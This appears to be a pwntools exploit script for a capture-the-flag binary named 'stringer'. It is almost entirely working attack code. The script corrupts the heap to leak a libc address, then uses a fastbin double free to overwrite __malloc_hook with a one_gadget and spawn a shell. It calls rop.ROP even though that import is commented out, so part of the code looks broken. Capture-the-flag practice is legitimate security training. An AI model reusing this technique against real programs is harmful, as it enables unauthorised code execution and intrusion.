from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "stringer.2018.teamrois.cn"
remote_port = 7272

# local_addr = "127.0.0.1"
# local_port = 1807

pc = "./stringer"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0000000000000D5E+0x555555554000\n')
		#b *0x0804887F \n 
		#0x400b6a

def ru(a):
	return p.recvuntil(a)

def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)
	
def new_string(size,content):
	sla('choice: ','1')
	sla('length: ',str(size))
	sla('content: ',content)

def edit_string(index,byte_i):
	sla('choice: ','3')
	sla('the index: ',str(index))
	sla('byte index: ',str(byte_i))

def delete_string(index):
	sla('choice: ','4')
	sla('index: ',str(index))

def hack():
	raw_input()
	new_string(0x80,'A')	#0
	new_string(0x80,'A')	#1
	new_string(0x68,'A')	#2
	new_string(0x68,'A')	#3
	new_string(0x20,'A')	#4

	delete_string(0)
	delete_string(1)

	payload = (p64(0) + p64(0x91)) * 9
	new_string(0x90,payload)	#5
	new_string(0x70,'A')	#6

	delete_string(1)

	edit_string(5,0x88)
	edit_string(5,0x88)

	new_string(0x80,'AAAAAAA')	#7
	ru('string: AAAAAAA\x0a')
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg('top_addr',top_addr)
	libc.address = top_addr - 0x58 - 0x3C4B20
	lg('libc.address',libc.address)
	malloc_hook_ptr = libc.symbols['__malloc_hook']
	lg('malloc_hook_ptr',malloc_hook_ptr)
	one_gadget = libc.address + 0xf02a4
	lg('one_gadget',one_gadget)
	
	delete_string(2)
	delete_string(3)
	delete_string(2)

	malloc_hook = libc
	fake_fd = malloc_hook_ptr - 0x28 + 5
	new_string(0x68,p64(fake_fd))
	new_string(0x68,'A')
	new_string(0x68,'A')
	payload = 'A'*3 + p64(one_gadget)*3
	new_string(0x68,payload)

	sla('choice: ','1')
	sla('length: ',str(1))

	p.interactive()

hack()